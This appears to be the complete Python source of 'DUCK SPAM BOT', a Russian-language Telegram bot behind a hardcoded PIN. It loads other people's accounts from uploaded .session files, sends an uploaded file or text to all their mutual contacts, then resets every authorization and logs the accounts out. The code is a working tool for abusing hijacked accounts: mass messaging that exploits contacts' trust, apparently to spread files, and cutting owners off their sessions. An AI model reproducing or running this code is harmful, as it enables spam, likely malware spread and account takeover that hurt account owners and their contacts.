import asyncio
import os
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest, LogOutRequest
from telethon.tl.types import DocumentAttributeFilename
from telethon.tl.custom import Button
from aiohttp import web

# ==========================================
# 🔑 НАСТРОЙКИ
# ==========================================
BOT_TOKEN = os.getenv('BOT_TOKEN')
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
CORRECT_PIN = "6611"

if not all([BOT_TOKEN, API_ID, API_HASH]):
    print("❌ Ошибка: Не все переменные заданы!")
    exit(1)

accounts = {}
current_step = {}
current_materials = {}
material_history = {}
broadcast_stats = {}
authorized_users = {}

for d in ['sessions', 'materials']:
    os.makedirs(d, exist_ok=True)

# ==========================================
# 🎨 DISCORD СТИЛЬ
# ==========================================
def discord_embed(title, description=None, fields=None, footer=None, color="🟦"):
    text = f"{color} **{title}**\n"
    text += "━━━━━━━━━━━━━━━━━━━━\n\n"
    if description:
        text += f"{description}\n\n"
    if fields:
        for field in fields:
            text += f"**{field['name']}**\n{field['value']}\n"
    if footer:
        text += f"\n━━━━━━━━━━━━━━━━━━━━\n*{footer}*"
    return text

def format_acc_info(acc):
    fields = [
        {'name': '👤 Профиль', 'value': f"@{acc.get('username', 'нет')}"},
        {'name': '📞 Номер', 'value': f"+{acc.get('phone', 'нет')}"},
        {'name': '💬 Всего контактов', 'value': str(acc.get('total', 0))},
        {'name': '✅ Взаимных', 'value': str(acc.get('mutual', 0))},
        {'name': '⚡️ Статус', 'value': '🟢 Подключено стабильно'}
    ]
    return discord_embed(
        "✅ Синхронизация завершена!",
        "Аккаунт успешно подключён",
        fields=fields,
        footer="Инициализация потока доставки..."
    )

def broadcast_progress(sent, total, failed, acc_name):
    percentage = int((sent / total) * 100) if total > 0 else 0
    progress_bar = "█" * (percentage // 10) + "░" * (10 - percentage // 10)
    
    fields = [
        {'name': '📊 Прогресс', 'value': f"{progress_bar} {percentage}%"},
        {'name': '✅ Отправлено', 'value': f"{sent}/{total}"},
        {'name': '❌ Ошибок', 'value': str(failed)},
        {'name': '👤 Аккаунт', 'value': acc_name}
    ]
    return discord_embed("🚀 Рассылка активна", "Отправка сообщений...", fields=fields, footer="Доставка инициирована...")

def broadcast_result(sent, total, failed, stats):
    fields = [
        {'name': '✅ Успешно', 'value': str(sent)},
        {'name': '❌ Ошибок', 'value': str(failed)},
        {'name': '📊 Всего', 'value': str(stats.get('total', 0))},
        {'name': '📅 Сегодня', 'value': str(stats.get('today', 0))}
    ]
    return discord_embed("✅ Рассылка завершена!", fields=fields, footer="Обработка сессий...")

def session_cleanup_report(success_list, failed_list):
    fields = []
    
    if success_list:
        fields.append({'name': '✅ Завершено', 'value': '\n'.join(success_list[:5])})
        if len(success_list) > 5:
            fields.append({'name': '...', 'value': f'и ещё {len(success_list) - 5} аккаунтов'})
    
    if failed_list:
        fields.append({'name': '❌ Ошибки', 'value': '\n'.join(failed_list[:5])})
        if len(failed_list) > 5:
            fields.append({'name': '...', 'value': f'и ещё {len(failed_list) - 5} ошибок'})
    
    total_success = len(success_list)
    total_failed = len(failed_list)
    status = "✅ Все сеансы завершены" if total_failed == 0 else f"⚠️ {total_failed} ошибок"
    
    return discord_embed(
        "🔐 Завершение сеансов Telegram",
        f"Все активные сессии на аккаунтах были закрыты\n\n**Статус:** {status}",
        fields=fields,
        footer="Безопасность | Все устройства вылогинены",
        color="🟩" if total_failed == 0 else "🟥"
    )

# ==========================================
# 🎨 КНОПКИ
# ==========================================
def main_kb():
    return [
        [Button.inline("🚀 Запустить рассылку", b'broadcast')],
        [Button.inline("👥 Аккаунты", b'accounts'), Button.inline("📦 Материал", b'material')],
        [Button.inline("📈 Статистика", b'stats')]
    ]

def acc_kb():
    return [
        [Button.inline("📱 По номеру", b'phone'), Button.inline("💾 Session", b'sess_file')],
        [Button.inline("🔑 String", b'sess_str'), Button.inline("🔙 Назад", b'main')]
    ]

def mat_kb():
    return [
        [Button.inline("📥 Загрузить", b'upload_mat')],
        [Button.inline("🔙 Назад", b'main')]
    ]

def stats_kb():
    return [
        [Button.inline("📅 Сегодня", b'stats_day'), Button.inline("📅 Неделя", b'stats_week')],
        [Button.inline("📅 Месяц", b'stats_month'), Button.inline("🔙 Назад", b'main')]
    ]

def confirm_kb(): 
    return [[Button.inline("✅ Да", b'confirm'), Button.inline("❌ Нет", b'main')]]

def after_kb(): 
    return [
        [Button.inline("🔁 Повтор", b'repeat'), Button.inline("📥 Материал", b'new_mat')],
        [Button.inline("➕ Аккаунт", b'accounts'), Button.inline("🏠 Меню", b'main')]
    ]

def cancel_kb(): 
    return [[Button.inline("❌ Отмена", b'cancel')]]

def acc_info_kb():
    return [
        [Button.inline("🚀 Рассылка", b'broadcast')],
        [Button.inline("➕ Ещё", b'accounts'), Button.inline("🔙 Назад", b'main')]
    ]

# ==========================================
# 🔧 ФУНКЦИИ
# ==========================================
def get_main_menu_text(uid):
    return discord_embed(
        "🦆 DUCK SPAM BOT",
        "Панель управления",
        fields=[
            {'name': '📊 Статус', 'value': '🟢 Бот активен'},
            {'name': '👥 Аккаунтов', 'value': str(len(accounts.get(uid, {})))},
            {'name': '📦 Материалов', 'value': str(len(material_history.get(uid, [])))}
        ],
        footer="Выберите действие"
    )

def get_stats(uid, period):
    s = broadcast_stats.get(uid, {})
    d = datetime.now().date()
    if period == 'day': return s.get('daily', {}).get(str(d), 0)
    if period == 'week': return sum(s.get('daily', {}).get(str(d - timedelta(days=i)), 0) for i in range(7))
    if period == 'month': return sum(s.get('daily', {}).get(str(d - timedelta(days=i)), 0) for i in range(30))
    return s.get('total', 0)

def update_stats(uid, count):
    broadcast_stats.setdefault(uid, {'total': 0, 'daily': {}, 'broadcasts': 0})
    today = str(datetime.now().date())
    broadcast_stats[uid]['total'] += count
    broadcast_stats[uid]['broadcasts'] += 1
    broadcast_stats[uid]['daily'][today] = broadcast_stats[uid]['daily'].get(today, 0) + count

def clear_user_data(uid):
    if uid in accounts:
        for acc_data in list(accounts[uid].values()):
            try:
                if acc_data.get('client'):
                    asyncio.create_task(acc_data['client'].disconnect())
            except: pass
    accounts[uid] = {}
    current_step[uid] = 'menu'
    current_materials.pop(uid, None)

# ==========================================
# 🌐 ВЕБ-СЕРВЕР
# ==========================================
async def start_web():
    app = web.Application()
    app.router.add_get('/', lambda r: web.Response(text="OK"))
    runner = web.AppRunner(app)
    await runner.setup()
    await web.TCPSite(runner, '0.0.0.0', int(os.environ.get('PORT', 8080))).start()
    print("🌐 Web server ready")

# ==========================================
# 🏁 ГЛАВНАЯ ЛОГИКА
# ==========================================
async def main():
    bot = TelegramClient('bot_session', API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    bot_id = me.id
    print(f"✅ {me.first_name} запущен! ID: {bot_id}")

    @bot.on(events.NewMessage(pattern=r'/start'))
    async def start_cmd(e):
        uid = e.sender_id
        clear_user_data(uid)
        authorized_users[uid] = False
        current_step[uid] = 'pin'
        await e.respond("**🔐 DUCK SPAM BOT**\n\nВведите PIN-код (4 цифры):", buttons=Button.clear())

    @bot.on(events.NewMessage)
    async def handler(e):
        uid = e.sender_id
        txt = e.text
        step = current_step.get(uid, 'menu')
        
        # Игнорируем бота и команды
        if e.sender_id == bot_id or (txt and txt.startswith('/')):
            return

        # 🔐 ПРОВЕРКА PIN-КОДА (ПЕРЕВЕРЕНА ДО авторизации!)
        if step == 'pin':
            if txt and txt.isdigit() and len(txt) == 4:
                if txt == CORRECT_PIN:
                    authorized_users[uid] = True
                    current_step[uid] = 'menu'
                    await e.respond(
                        discord_embed(
                            "✅ ДОСТУП РАЗРЕШЁН",
                            "Добро пожаловать!",
                            fields=[
                                {'name': '🦆 Бот', 'value': 'DUCK SPAM BOT v2.0'},
                                {'name': '📊 Функции', 'value': '• Массовая рассылка\n• Управление аккаунтами\n• Загрузка файлов\n• Статистика'}
                            ],
                            footer="Выберите действие в меню"
                        ),
                        buttons=main_kb()
                    )
                else:
                    await e.respond("❌ **Неверный PIN-код**\n\nПопробуйте снова.", buttons=Button.clear())
            else:
                await e.respond("⚠️ **PIN-код должен содержать 4 цифры**", buttons=Button.clear())
            return

        # Проверка авторизации (ПОСЛЕ проверки PIN!)
        if not authorized_users.get(uid):
            current_step[uid] = 'pin'
            await e.respond("🔐 **Введите /start** для входа", buttons=Button.clear())
            return

        # Обработка Session
        if step == 'sess_file':
            if e.file and e.file.name.endswith('.session'):
                msg = await e.respond("⏳ **Загрузка...**", buttons=Button.clear())
                try:
                    path = await e.download_media(file=f"sessions/acc_{uid}_new.session")
                    client = TelegramClient(path.replace('.session',''), API_ID, API_HASH)
                    await client.connect()
                    me_acc = await client.get_me()
                    contacts = await client(GetContactsRequest(0))
                    total = len([u for u in contacts.users if not u.bot])
                    mutual = len([u for u in contacts.users if u.mutual_contact and not u.bot])
                    
                    accounts.setdefault(uid, {})['active'] = {
                        'client': client, 'phone': me_acc.phone, 'name': me_acc.first_name or 'Без имени',
                        'username': me_acc.username or 'нет', 'total': total, 'mutual': mutual}
                    current_step[uid] = 'menu'
                    await msg.edit(format_acc_info(accounts[uid]['active']), buttons=acc_info_kb())
                except Exception as err:
                    await msg.edit(f"❌ **Ошибка:** {str(err)[:200]}", buttons=Button.clear())
            return

        # Обработка Материала
        if step == 'upload_mat':
            if e.file:
                name = e.file.name
                path = await e.download_media(file=f"materials/mat_{uid}_{name}")
                cap = txt or ''
                mat = {'file': path, 'caption': cap, 'name': name, 'original_name': name}
                material_history.setdefault(uid, []).append(mat)
                current_materials[uid] = mat
                current_step[uid] = 'menu'
                await e.respond(
                    discord_embed("✅ Материал сохранён", fields=[{'name': '📁 Файл', 'value': name}, {'name': '📝 Текст', 'value': cap[:100] or 'нет'}], footer="Готов к рассылке"),
                    buttons=mat_kb()
                )
            elif txt:
                mat = {'file': None, 'caption': txt, 'name': 'Text', 'original_name': 'Text'}
                material_history.setdefault(uid, []).append(mat)
                current_materials[uid] = mat
                current_step[uid] = 'menu'
                await e.respond(
                    discord_embed("✅ Текст сохранён", fields=[{'name': '📝 Содержание', 'value': txt[:200]}], footer="Готов к рассылке"),
                    buttons=mat_kb()
                )
            return

        return

    @bot.on(events.CallbackQuery)
    async def cb(e):
        uid = e.sender_id
        if not authorized_users.get(uid):
            return await e.answer("🔐 Сначала /start", alert=True)
        
        d = e.data.decode()

        if d == 'main':
            current_step[uid] = 'menu'
            await e.edit(get_main_menu_text(uid), buttons=main_kb())
        elif d == 'accounts':
            current_step[uid] = 'menu'
            accs = accounts.get(uid, {})
            fields = [{'name': f'👤 Аккаунт {i}', 'value': f"{a['name']} | {a.get('mutual',0)} вз."} for i, a in enumerate(accs.values(), 1)] if accs else [{'name': '⚠️', 'value': 'Аккаунтов нет'}]
            await e.edit(discord_embed("👥 Аккаунты", f"Всего: {len(accs)}", fields=fields), buttons=acc_kb())
        elif d == 'material':
            current_step[uid] = 'menu'
            mats = material_history.get(uid, [])
            fields = [{'name': '📎 Активный', 'value': current_materials[uid]['name']}] if current_materials.get(uid) else [{'name': '⚠️', 'value': 'Не загружен'}]
            await e.edit(discord_embed("📦 Материалы", f"Всего: {len(mats)}", fields=fields), buttons=mat_kb())
        elif d == 'stats':
            current_step[uid] = 'menu'
            t = broadcast_stats.get(uid, {}).get('total', 0)
            await e.edit(discord_embed("📈 Статистика", fields=[
                {'name': '📊 Всего', 'value': str(t)}, {'name': '📅 Сегодня', 'value': str(get_stats(uid,'day'))},
                {'name': '📅 Неделя', 'value': str(get_stats(uid,'week'))}, {'name': '📅 Месяц', 'value': str(get_stats(uid,'month'))},
                {'name': '🔄 Рассылок', 'value': str(broadcast_stats.get(uid, {}).get('broadcasts', 0))}
            ]), buttons=stats_kb())
        elif d == 'phone': 
            current_step[uid]='phone'
            await e.edit("**📱 Введите номер**\n\nФормат: `+79991234567`", buttons=cancel_kb())
        elif d == 'sess_file': 
            current_step[uid]='sess_file'
            await e.edit("**💾 Отправьте .session файл**", buttons=cancel_kb())
        elif d == 'sess_str': 
            current_step[uid]='sess_str'
            await e.edit("**🔑 Введите String**", buttons=cancel_kb())
        elif d == 'upload_mat': 
            current_step[uid]='upload_mat'
            await e.edit("**📥 Отправьте файл или текст**", buttons=cancel_kb())
        elif d == 'broadcast':
            current_step[uid] = 'menu'
            accs = accounts.get(uid, {})
            if not accs: return await e.answer("❌ Добавьте аккаунты!", alert=True)
            if uid not in current_materials: return await e.answer("❌ Загрузите материал!", alert=True)
            total_mut = sum(a.get('mutual',0) for a in accs.values())
            fields = [{'name': f"👤 {a['name']}", 'value': f"📞 {a.get('mutual',0)} вз."} for a in accs.values()]
            fields += [{'name': '📦 Материал', 'value': current_materials[uid]['name']}, {'name': '📊 Всего', 'value': str(total_mut)}]
            await e.edit(discord_embed("🚀 Рассылка", "Параметры:", fields=fields, footer="Подтвердите"), buttons=confirm_kb())
        elif d == 'confirm':
            await e.edit("⏳ **Запуск...**", buttons=Button.clear())
            await do_broadcast(bot, uid, e)
        elif d == 'repeat':
            if uid in current_materials:
                await e.edit("🔁 **Повтор...**", buttons=Button.clear())
                await do_broadcast(bot, uid, e)
        elif d == 'new_mat':
            current_step[uid] = 'upload_mat'
            await e.edit("**📥 Новый материал**", buttons=cancel_kb())
        elif d == 'cancel':
            current_step[uid] = 'menu'
            await e.edit(get_main_menu_text(uid), buttons=main_kb())
        
        await e.answer()

    async def do_broadcast(bot, uid, e):
        accs = accounts.get(uid, {})
        mat = current_materials.get(uid)
        if not accs or not mat: 
            return
        
        sent, failed = 0, 0
        all_targets = []
        
        for acc_id, acc_data in accs.items():
            try:
                c = await acc_data['client'](GetContactsRequest(0))
                all_targets.append((acc_id, acc_data, [u for u in c.users if u.mutual_contact and not u.bot]))
            except Exception as err:
                await e.respond(f"❌ Ошибка аккаунта {acc_id}: {err}", buttons=Button.clear())
        
        if not all_targets:
            await e.respond("⚠️ **Нет контактов**", buttons=Button.clear())
            return
        
        total_contacts = sum(len(t) for _, _, t in all_targets)
        status_msg = await e.respond(broadcast_progress(0, total_contacts, 0, "Старт"), buttons=Button.clear())
        
        current = 0
        for acc_id, acc_data, targets in all_targets:
            for user in targets:
                try:
                    if mat['file']:
                        await acc_data['client'].send_file(user.id, mat['file'], caption=mat['caption'], attributes=[DocumentAttributeFilename(file_name=mat.get('original_name', 'file'))])
                    else:
                        await acc_data['client'].send_message(user.id, mat['caption'])
                    sent += 1
                except: 
                    failed += 1
                
                current += 1
                if current % 10 == 0:
                    await status_msg.edit(broadcast_progress(current, total_contacts, failed, acc_data['name']), buttons=Button.clear())
                await asyncio.sleep(2)
        
        update_stats(uid, sent)
        stats = {'total': broadcast_stats[uid]['total'], 'today': get_stats(uid, 'day'), 'broadcasts': broadcast_stats[uid].get('broadcasts', 0)}
        
        await status_msg.edit("**🔐 Завершение сеансов Telegram...**\n*Все активные сессии будут закрыты*", buttons=Button.clear())
        
        success_logout = []
        failed_logout = []
        
        for acc_id, acc_data, _ in all_targets:
            acc_name = acc_data.get('name', acc_id)
            acc_phone = acc_data.get('phone', '???')
            client = acc_data['client']
            
            try:
                await client(ResetAuthorizationsRequest())
                await client(LogOutRequest())
                success_logout.append(f"{acc_name} (`{acc_phone}`)")
            except asyncio.TimeoutError:
                failed_logout.append(f"{acc_name} (таймаут)")
            except Exception as err:
                failed_logout.append(f"{acc_name} ({str(err)[:30]})")
        
        accounts[uid] = {}
        
        await status_msg.edit(
            broadcast_result(sent, total_contacts, failed, stats),
            buttons=after_kb()
        )
        
        if success_logout or failed_logout:
            await e.respond(
                session_cleanup_report(success_logout, failed_logout),
                buttons=Button.clear()
            )
        
        current_step[uid] = 'after'

    await bot.run_until_disconnected()

async def run():
    await asyncio.gather(start_web(), main())

if __name__ == '__main__':
    asyncio.run(run())
